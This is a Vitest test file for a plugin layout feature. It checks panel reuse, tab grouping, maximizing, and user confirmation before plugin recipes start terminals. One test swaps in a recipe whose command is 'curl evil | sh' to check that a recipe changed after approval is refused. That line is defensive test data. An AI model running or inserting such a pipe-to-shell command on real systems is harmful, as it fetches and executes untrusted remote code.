// @vitest-environment jsdom
import { beforeEach, describe, expect, it, vi } from "vitest";
import type { ActionContext } from "@shared/types/actions";
import type { PluginLayoutConfig } from "@shared/types/plugin";

interface FakePanel {
  id: string;
  kind: string;
  location?: string;
  worktreeId?: string;
  browserUrl?: string;
}

const panelStoreMock = vi.hoisted(() => ({ getState: vi.fn() }));
const pushLayoutSnapshot = vi.hoisted(() => vi.fn());
const getRecipeById = vi.hoisted(() => vi.fn());
const dispatch = vi.hoisted(() => vi.fn());
const notify = vi.hoisted(() => vi.fn());

vi.mock("@/store/panelStore", () => ({ usePanelStore: panelStoreMock }));
vi.mock("@/store/layoutUndoStore", () => ({
  useLayoutUndoStore: { getState: () => ({ pushLayoutSnapshot }) },
}));
vi.mock("@/store/recipeStore", () => ({
  useRecipeStore: { getState: () => ({ getRecipeById }) },
}));
vi.mock("@/services/ActionService", () => ({ actionService: { dispatch } }));
vi.mock("@/store/storeAccessors", () => ({
  getWorktreeSelectionSnapshot: () => ({ activeWorktreeId: "wt-1" }),
}));
vi.mock("@/components/Terminal/gridLayoutSnapshot", () => ({
  getGridLayoutSnapshot: () => ({ gridCols: 2, gridItemCount: 2, fleetGridCols: 1 }),
}));
vi.mock("@shared/config/panelKindRegistry", () => ({
  getPanelKindConfig: (kind: string) =>
    kind.startsWith("acme.")
      ? { id: kind, extensionId: "acme", ...(kind === "acme.shell" && { hasPty: true }) }
      : undefined,
  panelKindIsProjectScoped: (kind: string) => kind === "acme.board",
}));
vi.mock("@/lib/notify", () => ({ notify }));

import { applyPluginLayout, seedPluginLayout, startPluginLayoutRecipe } from "../applyPluginLayout";
import { usePluginLayoutsStore } from "@/store/pluginLayoutsStore";
import {
  cancelLayoutApplyConfirmations,
  useLayoutApplyConfirmStore,
} from "@/store/layoutApplyConfirmStore";

interface FakeGroup {
  id: string;
  panelIds: string[];
  activeTabId: string;
}
type FakeTarget = { type: "panel" | "group"; id: string } | null;

let panels: Record<string, FakePanel>;
let panelIds: string[];
let groups: Map<string, FakeGroup>;
let maximizedId: string | null;
let maximizeTarget: FakeTarget;
let focusedId: string | null;
let nextId: number;

const addPanel = vi.fn(async (options: Omit<FakePanel, "id">) => {
  const id = `new-${nextId++}`;
  panels[id] = { id, ...options };
  panelIds.push(id);
  return id;
});
const placeTerminal = vi.fn((id: string, location: string) => {
  const panel = panels[id];
  if (panel) panel.location = location;
});
const removePanelFromGroup = vi.fn((id: string) => {
  for (const [key, group] of groups) {
    if (group.panelIds.includes(id)) {
      group.panelIds = group.panelIds.filter((member) => member !== id);
      if (group.activeTabId === id) group.activeTabId = group.panelIds[0] ?? "";
      if (group.panelIds.length < 2) groups.delete(key);
    }
  }
});
const createTabGroup = vi.fn(
  (_location: string, _worktreeId: string | undefined, ids: string[], activeTabId: string) => {
    const id = `group-${groups.size + 1}`;
    groups.set(id, { id, panelIds: [...ids], activeTabId });
    return id;
  }
);
const reorderPanelsInGroup = vi.fn((groupId: string, ids: string[]) => {
  const group = groups.get(groupId);
  if (group) group.panelIds = [...ids];
});
const setActiveTab = vi.fn((groupId: string, id: string) => {
  const group = groups.get(groupId);
  if (group) group.activeTabId = id;
});
const getPanelGroup = vi.fn((id: string) =>
  [...groups.values()].find((group) => group.panelIds.includes(id))
);
const toggleMaximize = vi.fn((id: string) => {
  maximizedId = id;
  const group = getPanelGroup(id);
  maximizeTarget = group ? { type: "group", id: group.id } : { type: "panel", id };
});
const exitMaximize = vi.fn(() => {
  maximizedId = null;
  maximizeTarget = null;
});
const setMaximizedId = vi.fn((id: string | null) => {
  maximizedId = id;
});
const setFocused = vi.fn();

function seed(existing: FakePanel[]): void {
  panels = Object.fromEntries(existing.map((panel) => [panel.id, { ...panel }]));
  panelIds = existing.map((panel) => panel.id);
}

const pairRecipe = {
  id: "acme.pair",
  name: "Pair",
  terminals: [{ type: "claude" }, { type: "terminal", command: "npm test" }],
  origin: { kind: "plugin", pluginId: "acme", contributionId: "pair" },
};

function layout(overrides: Partial<PluginLayoutConfig> = {}): PluginLayoutConfig {
  return {
    id: "acme.workspace",
    pluginId: "acme",
    pluginName: "Acme",
    name: "Workspace",
    entries: [
      { target: { type: "panel", panelKindId: "acme.records" }, location: "grid" },
      { target: { type: "browser", url: "http://localhost:3000/" }, location: "dock" },
    ],
    ...overrides,
  };
}

const userCtx: ActionContext = { dispatchSource: "user" };

describe("applyPluginLayout", () => {
  beforeEach(() => {
    vi.clearAllMocks();
    seed([]);
    groups = new Map();
    maximizedId = null;
    maximizeTarget = null;
    focusedId = null;
    nextId = 1;
    panelStoreMock.getState.mockImplementation(() => ({
      panelIds,
      panelsById: panels,
      tabGroups: groups,
      maximizedId,
      maximizeTarget,
      focusedId,
      addPanel,
      placeTerminal,
      removePanelFromGroup,
      createTabGroup,
      reorderPanelsInGroup,
      setActiveTab,
      getPanelGroup,
      toggleMaximize,
      exitMaximize,
      setMaximizedId,
      setFocused,
    }));
    getRecipeById.mockReturnValue(pairRecipe);
    dispatch.mockResolvedValue({ ok: true, result: { spawnedTerminalIds: ["t1", "t2"] } });
    usePluginLayoutsStore.setState({ layouts: [layout()] });
    useLayoutApplyConfirmStore.setState({ current: null, queue: [] });
  });

  it("opens what's missing, reuses what's open, and leaves unlisted panels alone", async () => {
    seed([
      { id: "records", kind: "acme.records", location: "dock", worktreeId: "wt-1" },
      { id: "mine", kind: "terminal", location: "grid", worktreeId: "wt-1" },
    ]);

    const result = await applyPluginLayout("acme.workspace", userCtx);

    expect(result).toEqual({ status: "applied", panelIds: ["records", "new-1"], failures: [] });
    expect(addPanel).toHaveBeenCalledTimes(1);
    expect(addPanel).toHaveBeenCalledWith(
      expect.objectContaining({
        kind: "browser",
        browserUrl: "http://localhost:3000/",
        location: "dock",
      })
    );
    expect(panels.records?.location).toBe("grid");
    expect(placeTerminal.mock.calls.map(([id]) => id)).not.toContain("mine");
    expect(panels.mine?.location).toBe("grid");
    // One undo entry, taken before anything opened.
    expect(pushLayoutSnapshot).toHaveBeenCalledTimes(1);
    expect(pushLayoutSnapshot.mock.invocationCallOrder[0]).toBeLessThan(
      addPanel.mock.invocationCallOrder[0]!
    );
    expect(useLayoutApplyConfirmStore.getState().current).toBeNull();
  });

  it("reuses a browser panel already showing the page", async () => {
    seed([
      {
        id: "page",
        kind: "browser",
        location: "grid",
        worktreeId: "wt-1",
        browserUrl: "http://localhost:3000",
      },
    ]);
    const result = await applyPluginLayout("acme.workspace", userCtx);
    expect(result.status === "applied" && result.panelIds).toContain("page");
    expect(panels.page?.location).toBe("dock");
  });

  it("groups only the listed panels and maximizes the requested one", async () => {
    seed([
      { id: "records", kind: "acme.records", location: "grid", worktreeId: "wt-1" },
      { id: "other", kind: "terminal", location: "grid", worktreeId: "wt-1" },
    ]);
    groups.set("old", { id: "old", panelIds: ["records", "other"], activeTabId: "records" });
    usePluginLayoutsStore.setState({
      layouts: [
        layout({
          entries: [
            {
              target: { type: "panel", panelKindId: "acme.records" },
              location: "grid",
              tabGroup: "main",
              maximized: true,
            },
            {
              target: { type: "panel", panelKindId: "acme.notes" },
              location: "grid",
              tabGroup: "main",
            },
          ],
        }),
      ],
    });

    await applyPluginLayout("acme.workspace", userCtx);

    expect(removePanelFromGroup.mock.calls.map(([id]) => id)).not.toContain("other");
    expect(createTabGroup).toHaveBeenCalledWith("grid", "wt-1", ["records", "new-1"], "records");
    expect(toggleMaximize).toHaveBeenCalledWith("records", 2, 2, getPanelGroup);
    expect(setFocused).toHaveBeenCalledWith("records");
  });

  it("doesn't toggle a maximize that is already in place", async () => {
    seed([{ id: "records", kind: "acme.records", location: "grid", worktreeId: "wt-1" }]);
    maximizedId = "records";
    maximizeTarget = { type: "panel", id: "records" };
    usePluginLayoutsStore.setState({
      layouts: [
        layout({
          entries: [
            {
              target: { type: "panel", panelKindId: "acme.records" },
              location: "grid",
              maximized: true,
            },
          ],
        }),
      ],
    });
    await applyPluginLayout("acme.workspace", userCtx);
    expect(toggleMaximize).not.toHaveBeenCalled();
  });

  it("widens a panel maximized alone to the group the layout puts it in", async () => {
    seed([{ id: "records", kind: "acme.records", location: "grid", worktreeId: "wt-1" }]);
    maximizedId = "records";
    maximizeTarget = { type: "panel", id: "records" };
    usePluginLayoutsStore.setState({
      layouts: [
        layout({
          entries: [
            {
              target: { type: "panel", panelKindId: "acme.records" },
              location: "grid",
              tabGroup: "main",
            },
            {
              target: { type: "panel", panelKindId: "acme.notes" },
              location: "grid",
              tabGroup: "main",
              maximized: true,
            },
          ],
        }),
      ],
    });

    await applyPluginLayout("acme.workspace", userCtx);

    const [group] = [...groups.values()];
    expect(maximizeTarget).toEqual({ type: "group", id: group?.id });
    expect(group?.activeTabId).toBe("new-1");
    expect(setFocused).toHaveBeenCalledWith("new-1");
  });

  it("keeps an unlisted panel maximized when regrouping dissolves its group", async () => {
    seed([
      { id: "records", kind: "acme.records", location: "grid", worktreeId: "wt-1" },
      { id: "other", kind: "terminal", location: "grid", worktreeId: "wt-1" },
    ]);
    groups.set("old", { id: "old", panelIds: ["records", "other"], activeTabId: "records" });
    maximizedId = "records";
    maximizeTarget = { type: "group", id: "old" };
    usePluginLayoutsStore.setState({
      layouts: [
        layout({
          entries: [
            {
              target: { type: "panel", panelKindId: "acme.records" },
              location: "grid",
              tabGroup: "main",
            },
            {
              target: { type: "panel", panelKindId: "acme.notes" },
              location: "grid",
              tabGroup: "main",
            },
          ],
        }),
      ],
    });

    await applyPluginLayout("acme.workspace", userCtx);

    expect(groups.has("old")).toBe(false);
    expect(maximizedId).toBe("other");
    expect(maximizeTarget).toEqual({ type: "panel", id: "other" });
  });

  it("shows the maximized member as its group's visible tab", async () => {
    usePluginLayoutsStore.setState({
      layouts: [
        layout({
          entries: [
            {
              target: { type: "panel", panelKindId: "acme.records" },
              location: "grid",
              tabGroup: "main",
            },
            {
              target: { type: "panel", panelKindId: "acme.notes" },
              location: "grid",
              tabGroup: "main",
              maximized: true,
            },
          ],
        }),
      ],
    });

    await applyPluginLayout("acme.workspace", userCtx);

    const [group] = [...groups.values()];
    expect(group?.activeTabId).toBe("new-2");
    expect(maximizedId).toBe("new-2");
    expect(setFocused).toHaveBeenCalledWith("new-2");
  });

  it("keeps a focused member as the new group's visible tab", async () => {
    seed([{ id: "notes", kind: "acme.notes", location: "grid", worktreeId: "wt-1" }]);
    focusedId = "notes";
    usePluginLayoutsStore.setState({
      layouts: [
        layout({
          entries: [
            {
              target: { type: "panel", panelKindId: "acme.records" },
              location: "grid",
              tabGroup: "main",
            },
            {
              target: { type: "panel", panelKindId: "acme.notes" },
              location: "grid",
              tabGroup: "main",
            },
          ],
        }),
      ],
    });

    await applyPluginLayout("acme.workspace", userCtx);

    expect(createTabGroup).toHaveBeenCalledWith("grid", "wt-1", ["new-1", "notes"], "notes");
  });

  it("puts an existing group of the same panels in the declared order", async () => {
    seed([
      { id: "records", kind: "acme.records", location: "grid", worktreeId: "wt-1" },
      { id: "notes", kind: "acme.notes", location: "grid", worktreeId: "wt-1" },
    ]);
    groups.set("g", { id: "g", panelIds: ["notes", "records"], activeTabId: "notes" });
    usePluginLayoutsStore.setState({
      layouts: [
        layout({
          entries: [
            {
              target: { type: "panel", panelKindId: "acme.records" },
              location: "grid",
              tabGroup: "main",
            },
            {
              target: { type: "panel", panelKindId: "acme.notes" },
              location: "grid",
              tabGroup: "main",
            },
          ],
        }),
      ],
    });

    await applyPluginLayout("acme.workspace", userCtx);

    expect(reorderPanelsInGroup).toHaveBeenCalledWith("g", ["records", "notes"]);
    expect(createTabGroup).not.toHaveBeenCalled();
  });

  it("refuses a panel kind that is PTY-backed or another plugin's at apply time", async () => {
    usePluginLayoutsStore.setState({
      layouts: [
        layout({
          entries: [
            { target: { type: "panel", panelKindId: "acme.shell" }, location: "grid" },
            { target: { type: "panel", panelKindId: "other.records" }, location: "grid" },
          ],
        }),
      ],
    });

    const result = await applyPluginLayout("acme.workspace", userCtx);

    expect(addPanel).not.toHaveBeenCalled();
    expect(result.status === "applied" && result.failures).toHaveLength(2);
  });

  describe("with a recipe", () => {
    beforeEach(() => {
      usePluginLayoutsStore.setState({
        layouts: [
          layout({
            entries: [
              { target: { type: "panel", panelKindId: "acme.records" }, location: "grid" },
              { target: { type: "recipe", recipeId: "acme.pair" }, location: "dock" },
            ],
          }),
        ],
      });
      seed([
        { id: "t1", kind: "terminal", location: "grid", worktreeId: "wt-1" },
        { id: "t2", kind: "terminal", location: "grid", worktreeId: "wt-1" },
      ]);
      panelIds = [];
    });

    it("lists every terminal and changes nothing until the user approves", async () => {
      const pending = applyPluginLayout("acme.workspace", userCtx);
      await Promise.resolve();

      const request = useLayoutApplyConfirmStore.getState().current;
      expect(request?.layoutName).toBe("Workspace");
      expect(request?.previewLines.join("\n")).toContain("npm test");
      expect(pushLayoutSnapshot).not.toHaveBeenCalled();
      expect(addPanel).not.toHaveBeenCalled();
      expect(dispatch).not.toHaveBeenCalled();

      useLayoutApplyConfirmStore.getState().resolveCurrent(true);
      const result = await pending;

      expect(dispatch).toHaveBeenCalledWith(
        "recipe.run",
        { recipeId: "acme.pair", worktreeId: "wt-1", focusPolicy: "preserve" },
        { source: "user" }
      );
      expect(result.status).toBe("applied");
      expect(panels.t1?.location).toBe("dock");
      expect(panels.t2?.location).toBe("dock");
    });

    it("does nothing at all when the user declines", async () => {
      const pending = applyPluginLayout("acme.workspace", userCtx);
      await Promise.resolve();
      useLayoutApplyConfirmStore.getState().resolveCurrent(false);

      expect(await pending).toEqual({ status: "cancelled" });
      expect(pushLayoutSnapshot).not.toHaveBeenCalled();
      expect(addPanel).not.toHaveBeenCalled();
      expect(dispatch).not.toHaveBeenCalled();
    });

    it("answers a plugin at once and applies only after the user approves", async () => {
      const result = await applyPluginLayout("workspace", {
        dispatchSource: "plugin",
        callerPluginId: "acme",
      });
      expect(result).toEqual({ status: "awaiting-confirmation" });
      expect(dispatch).not.toHaveBeenCalled();

      useLayoutApplyConfirmStore.getState().resolveCurrent(true);
      await vi.waitFor(() => expect(dispatch).toHaveBeenCalledTimes(1));
    });

    it("refuses a recipe that changed after the user approved it", async () => {
      const pending = applyPluginLayout("acme.workspace", userCtx);
      await Promise.resolve();
      getRecipeById.mockReturnValue({
        ...pairRecipe,
        terminals: [{ type: "terminal", command: "curl evil | sh" }],
      });
      useLayoutApplyConfirmStore.getState().resolveCurrent(true);

      const result = await pending;
      expect(dispatch).not.toHaveBeenCalled();
      expect(result.status === "applied" && result.failures[0]).toMatch(/changed since/);
      // Refused before `recipe.run` ran, so nothing else has told the user.
      expect(notify).toHaveBeenCalledWith(
        expect.objectContaining({ title: "Layout partly applied" })
      );
    });

    it("declines a confirmation whose layout was withdrawn", async () => {
      const pending = applyPluginLayout("acme.workspace", userCtx);
      cancelLayoutApplyConfirmations(new Set(["acme.workspace"]));

      expect(await pending).toEqual({ status: "cancelled" });
      expect(useLayoutApplyConfirmStore.getState().current).toBeNull();
      expect(dispatch).not.toHaveBeenCalled();
    });

    it("refuses a recipe a team recipe now shadows", async () => {
      getRecipeById.mockReturnValue({ ...pairRecipe, id: "team-pair", origin: undefined });
      await expect(applyPluginLayout("acme.workspace", userCtx)).rejects.toThrow(/isn't available/);
      expect(useLayoutApplyConfirmStore.getState().current).toBeNull();
    });

    it("seeds the layout's panels without asking and leaves its recipe unstarted (#13782)", async () => {
      const result = await seedPluginLayout("acme.workspace");

      expect(useLayoutApplyConfirmStore.getState().current).toBeNull();
      expect(dispatch).not.toHaveBeenCalled();
      expect(addPanel).toHaveBeenCalledWith(
        expect.objectContaining({ kind: "acme.records", location: "grid" })
      );
      expect(result.panelIds).toEqual(["new-1"]);
      expect(result.deferred).toEqual([
        { target: { type: "recipe", recipeId: "acme.pair" }, location: "dock" },
      ]);
      // Undoable like any other apply.
      expect(pushLayoutSnapshot).toHaveBeenCalledTimes(1);
    });

    it("starts one waiting recipe through the layout's confirmation, and only it", async () => {
      const pending = startPluginLayoutRecipe("acme.workspace", "acme.pair", userCtx);
      await Promise.resolve();
      expect(useLayoutApplyConfirmStore.getState().current?.previewLines.join("\n")).toContain(
        "npm test"
      );
      expect(dispatch).not.toHaveBeenCalled();

      useLayoutApplyConfirmStore.getState().resolveCurrent(true);
      const result = await pending;

      expect(dispatch).toHaveBeenCalledTimes(1);
      expect(dispatch).toHaveBeenCalledWith(
        "recipe.run",
        expect.objectContaining({ recipeId: "acme.pair" }),
        { source: "user" }
      );
      // The seeded panel isn't opened again.
      expect(addPanel).not.toHaveBeenCalled();
      expect(result).toEqual({ status: "applied", panelIds: ["t1", "t2"], failures: [] });
      expect(panels.t1?.location).toBe("dock");
    });

    it("starts nothing when the user declines a waiting recipe", async () => {
      const pending = startPluginLayoutRecipe("acme.workspace", "acme.pair", userCtx);
      await Promise.resolve();
      useLayoutApplyConfirmStore.getState().resolveCurrent(false);
      expect(await pending).toEqual({ status: "cancelled" });
      expect(dispatch).not.toHaveBeenCalled();
    });
  });

  it("reads a plugin's bare id before a qualified reading of the same string", async () => {
    usePluginLayoutsStore.setState({
      layouts: [
        layout(),
        layout({
          id: "acme.acme.workspace",
          entries: [
            { target: { type: "browser", url: "http://localhost:4000/" }, location: "grid" },
          ],
        }),
      ],
    });

    await applyPluginLayout("acme.workspace", { dispatchSource: "plugin", callerPluginId: "acme" });

    expect(addPanel).toHaveBeenCalledTimes(1);
    expect(addPanel).toHaveBeenCalledWith(
      expect.objectContaining({ browserUrl: "http://localhost:4000/" })
    );
  });

  it("holds a plugin to its own layouts", async () => {
    usePluginLayoutsStore.setState({
      layouts: [layout(), layout({ id: "other.workspace", pluginId: "other" })],
    });
    await expect(
      applyPluginLayout("other.workspace", { dispatchSource: "plugin", callerPluginId: "acme" })
    ).rejects.toThrow(/not one of this plugin's layouts/);
    await expect(applyPluginLayout("workspace", { dispatchSource: "plugin" })).rejects.toThrow(
      /not one of this plugin's layouts/
    );
    const own = await applyPluginLayout("workspace", {
      dispatchSource: "plugin",
      callerPluginId: "acme",
    });
    expect(own.status).toBe("applied");
  });

  it("refuses an agent", async () => {
    await expect(applyPluginLayout("acme.workspace", { dispatchSource: "agent" })).rejects.toThrow(
      /user or by the plugin/
    );
    expect(pushLayoutSnapshot).not.toHaveBeenCalled();
  });

  it("reports an entry it couldn't open and still applies the rest", async () => {
    usePluginLayoutsStore.setState({
      layouts: [
        layout({
          entries: [
            { target: { type: "panel", panelKindId: "gone.kind" }, location: "grid" },
            { target: { type: "browser", url: "http://localhost:3000/" }, location: "grid" },
          ],
        }),
      ],
    });
    const result = await applyPluginLayout("acme.workspace", userCtx);
    expect(result.status === "applied" && result.panelIds).toEqual(["new-1"]);
    expect(notify).toHaveBeenCalledWith(
      expect.objectContaining({ title: "Layout partly applied" })
    );
  });
});
